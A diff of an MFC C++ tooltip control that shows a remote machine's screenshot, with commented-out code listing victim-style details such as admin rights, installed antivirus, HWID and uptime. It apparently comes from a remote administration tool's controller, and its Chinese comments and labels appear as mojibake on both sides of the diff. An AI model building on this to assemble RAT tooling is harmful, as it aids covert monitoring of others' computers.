@@ -1,4 +1,4 @@
-#include "stdafx.h"
+ï»¿#include "stdafx.h"
 #include "Quick.h"
 #include "TipfileCtrl.h"
 #ifdef _DEBUG
@@ -48,15 +48,15 @@ CCoolTipfileCtrl::CCoolTipfileCtrl()
 
 	m_fntBold.CreateFont(-14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
 		DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
-		DEFAULT_PITCH | FF_DONTCARE, _T("ËÎÌå"));
+		DEFAULT_PITCH | FF_DONTCARE, _T("å®‹ä½“"));
 	//m_fntBold.CreateFont(
-	//	-11/*¸ß¶È*/, -7.5/*¿í¶È*/, 0/*²»ÓÃ¹Ü*/, 0/*²»ÓÃ¹Ü*/, 400 /*Ò»°ãÕâ¸öÖµÉèÎª400*/,
-	//	FALSE/*²»´øÐ±Ìå*/, FALSE/*²»´øÏÂ»®Ïß*/, FALSE/*²»´øÉ¾³ýÏß*/,
-	//	DEFAULT_CHARSET,  //ÕâÀïÎÒÃÇÊ¹ÓÃÄ¬ÈÏ×Ö·û¼¯£¬»¹ÓÐÆäËûÒÔ _CHARSET ½áÎ²µÄ³£Á¿¿ÉÓÃ
-	//	OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS,  //ÕâÐÐ²ÎÊý²»ÓÃ¹Ü
-	//	DEFAULT_QUALITY,  //Ä¬ÈÏÊä³öÖÊÁ¿
-	//	FF_DONTCARE,  //²»Ö¸¶¨×ÖÌå×å*/
-	//	TEXT("Î¢ÈíÑÅºÚ")  //×ÖÌåÃû
+	//	-11/*é«˜åº¦*/, -7.5/*å®½åº¦*/, 0/*ä¸ç”¨ç®¡*/, 0/*ä¸ç”¨ç®¡*/, 400 /*ä¸€èˆ¬è¿™ä¸ªå€¼è®¾ä¸º400*/,
+	//	FALSE/*ä¸å¸¦æ–œä½“*/, FALSE/*ä¸å¸¦ä¸‹åˆ’çº¿*/, FALSE/*ä¸å¸¦åˆ é™¤çº¿*/,
+	//	DEFAULT_CHARSET,  //è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨é»˜è®¤å­—ç¬¦é›†ï¼Œè¿˜æœ‰å…¶ä»–ä»¥ _CHARSET ç»“å°¾çš„å¸¸é‡å¯ç”¨
+	//	OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS,  //è¿™è¡Œå‚æ•°ä¸ç”¨ç®¡
+	//	DEFAULT_QUALITY,  //é»˜è®¤è¾“å‡ºè´¨é‡
+	//	FF_DONTCARE,  //ä¸æŒ‡å®šå­—ä½“æ—*/
+	//	TEXT("å¾®è½¯é›…é»‘")  //å­—ä½“å
 	//);
 }
 
@@ -440,62 +440,62 @@ BOOL CCoolTipfileCtrl::OnPrepare()
 void CCoolTipfileCtrl::OnCalcSize(CDC* pDC)
 {
 
-	//½ØÍ¼
+	//æˆªå›¾
 	if (pContext->PictureSize != 0 && mbshowpic)
 	{
 		m_sz.cx = pContext->iScreenWidth;
 		m_sz.cy = pContext->iScreenHeight;
 		m_sz.cy += TIP_RULE;
 	}
-	////µ±Ç°´°¿Ú
+	////å½“å‰çª—å£
 	//if (!pContext->LoginInfo) return;
 
-	////·Ö×é
+	////åˆ†ç»„
 	//AddSize(pDC, pContext->LoginInfo->Group);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 
-	////¼ÆËã»úÃû
+	////è®¡ç®—æœºå
 	//AddSize(pDC, pContext->LoginInfo->CptName);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 
-	////ÏµÍ³Ãû
+	////ç³»ç»Ÿå
 	//AddSize(pDC, pContext->LoginInfo->OSVersion);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 
 	////CPU
 	//AddSize(pDC, pContext->LoginInfo->CPU);
 	//m_sz.cy += TIP_TEXTHEIGHT;
-	////Ó²ÅÌ+ÄÚ´æ
+	////ç¡¬ç›˜+å†…å­˜
 	//AddSize(pDC, pContext->LoginInfo->DAM);
 	//m_sz.cy += TIP_TEXTHEIGHT;
-	////ÏÔ¿¨
+	////æ˜¾å¡
 	//AddSize(pDC, pContext->LoginInfo->GPU);
 	//m_sz.cy += TIP_TEXTHEIGHT;
-	////°æ±¾
+	////ç‰ˆæœ¬
 	//AddSize(pDC, pContext->LoginInfo->Version);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 
-	////È¨ÏÞ
+	////æƒé™
 	//AddSize(pDC, pContext->LoginInfo->IsAdmin);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 
-	////É±Èí
+	////æ€è½¯
 	//AddSize(pDC, pContext->LoginInfo->Virus);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 
-	////ÏµÍ³ÓïÑÔ
+	////ç³»ç»Ÿè¯­è¨€
 	//AddSize(pDC, pContext->LoginInfo->lpLCData);
 	//m_sz.cy += TIP_TEXTHEIGHT;
-	////ÏÔÊ¾Æ÷ÐÅÏ¢
+	////æ˜¾ç¤ºå™¨ä¿¡æ¯
 	//AddSize(pDC, pContext->LoginInfo->Monitors);
 	//m_sz.cy += TIP_TEXTHEIGHT;
-	////ÏµÍ³Ä¿Â¼
+	////ç³»ç»Ÿç›®å½•
 	//AddSize(pDC, pContext->LoginInfo->szSysdire);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 	////HWID
 	//AddSize(pDC, pContext->LoginInfo->szHWID);
 	//m_sz.cy += TIP_TEXTHEIGHT;
-	////ÔËÐÐÊ±¼ä
+	////è¿è¡Œæ—¶é—´
 	//AddSize(pDC, pContext->LoginInfo->m_Time);
 	//m_sz.cy += TIP_TEXTHEIGHT;
 	
@@ -513,7 +513,7 @@ void CCoolTipfileCtrl::OnHide()
 void CCoolTipfileCtrl::OnPaint(CDC* pDC)
 {
 	CPoint pt(0, 0);
-	//½ØÍ¼
+	//æˆªå›¾
 	if (pContext->PictureSize != 0 && mbshowpic)
 	{
 		HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pContext->PictureSize);
@@ -530,7 +530,7 @@ void CCoolTipfileCtrl::OnPaint(CDC* pDC)
 				if (CreateStreamOnHGlobal(NULL, TRUE, &pOutStream) == S_OK)
 				{
 
-					if (image.GetBPP() == 32) //È·ÈÏ¸ÃÍ¼Ïñ°üº¬AlphaÍ¨µÀ
+					if (image.GetBPP() == 32) //ç¡®è®¤è¯¥å›¾åƒåŒ…å«Alphaé€šé“
 					{
 						int i;
 						int j;
@@ -560,101 +560,101 @@ void CCoolTipfileCtrl::OnPaint(CDC* pDC)
 	}
 
 
-	////µ±Ç°´°¿Ú
+	////å½“å‰çª—å£
 	//if (!pContext->LoginInfo) return;
 
 	//pDC->SetTextColor(RGB(0, 128, 0));
 
-	////·Ö×é
-	//DrawText(pDC, &pt, _T(":·Ö×é"));
+	////åˆ†ç»„
+	//DrawText(pDC, &pt, _T(":åˆ†ç»„"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->Group);
 	//pt.y += TIP_TEXTHEIGHT;
 
-	////¼ÆËã»úÃû
+	////è®¡ç®—æœºå
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":¼ÆËã»úÃû"));
+	//DrawText(pDC, &pt, _T(":è®¡ç®—æœºå"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->CptName);
 	//pt.y += TIP_TEXTHEIGHT;
 
-	////ÏµÍ³Ãû
+	////ç³»ç»Ÿå
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":ÏµÍ³"));
+	//DrawText(pDC, &pt, _T(":ç³»ç»Ÿ"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->OSVersion);
 	//pt.y += TIP_TEXTHEIGHT;
 
 	////CPU
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":CPUºËÐÄ"));
+	//DrawText(pDC, &pt, _T(":CPUæ ¸å¿ƒ"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->CPU);
 	//pt.y += TIP_TEXTHEIGHT;
 
-	////Ó²ÅÌ+ÄÚ´æ
+	////ç¡¬ç›˜+å†…å­˜
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":Ó²ÅÌÄÚ´æ"));
+	//DrawText(pDC, &pt, _T(":ç¡¬ç›˜å†…å­˜"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->DAM);
 	//pt.y += TIP_TEXTHEIGHT;
 
-	////ÏÔ¿¨
+	////æ˜¾å¡
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":ÏÔ¿¨"));
+	//DrawText(pDC, &pt, _T(":æ˜¾å¡"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->GPU);
 	//pt.y += TIP_TEXTHEIGHT;
 
-	////°æ±¾
+	////ç‰ˆæœ¬
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":°æ±¾"));
+	//DrawText(pDC, &pt, _T(":ç‰ˆæœ¬"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->Version);
 	//pt.y += TIP_TEXTHEIGHT;
 
 
-	////È¨ÏÞ
+	////æƒé™
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":ÓÃ»§È¨ÏÞ"));
+	//DrawText(pDC, &pt, _T(":ç”¨æˆ·æƒé™"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->IsAdmin);
 	//pt.y += TIP_TEXTHEIGHT;
 
-	////É±Èí
+	////æ€è½¯
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":É±¶¾Èí¼þ"));
+	//DrawText(pDC, &pt, _T(":æ€æ¯’è½¯ä»¶"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->Virus);
 	//pt.y += TIP_TEXTHEIGHT;
 
-	////ÏµÍ³ÓïÑÔ
+	////ç³»ç»Ÿè¯­è¨€
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":ÏµÍ³ÓïÑÔ"));
+	//DrawText(pDC, &pt, _T(":ç³»ç»Ÿè¯­è¨€"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->lpLCData);
 	//pt.y += TIP_TEXTHEIGHT;
-	////ÏÔÊ¾Æ÷ÐÅÏ¢
+	////æ˜¾ç¤ºå™¨ä¿¡æ¯
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":ÏÔÊ¾Æ÷"));
+	//DrawText(pDC, &pt, _T(":æ˜¾ç¤ºå™¨"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->Monitors);
 	//pt.y += TIP_TEXTHEIGHT;
-	////ÏµÍ³Ä¿Â¼
+	////ç³»ç»Ÿç›®å½•
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":ÏµÍ³Ä¿Â¼"));
+	//DrawText(pDC, &pt, _T(":ç³»ç»Ÿç›®å½•"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->szSysdire);
 	//pt.y += TIP_TEXTHEIGHT;
 	////HWID
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":¿Í»§±àºÅ"));
+	//DrawText(pDC, &pt, _T(":å®¢æˆ·ç¼–å·"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->szHWID);
 	//pt.y += TIP_TEXTHEIGHT;
-	////ÔËÐÐÊ±¼ä
+	////è¿è¡Œæ—¶é—´
 	//pt.x -= 75;
-	//DrawText(pDC, &pt, _T(":ÔËÐÐÊ±¼ä"));
+	//DrawText(pDC, &pt, _T(":è¿è¡Œæ—¶é—´"));
 	//pt.x += 75;
 	//DrawText(pDC, &pt, pContext->LoginInfo->m_Time);
 	//pt.y += TIP_TEXTHEIGHT;
